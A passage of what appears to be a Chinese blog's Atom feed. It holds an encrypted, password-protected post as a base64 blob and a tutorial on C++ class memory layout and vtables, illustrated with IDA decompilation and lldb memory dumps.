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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                    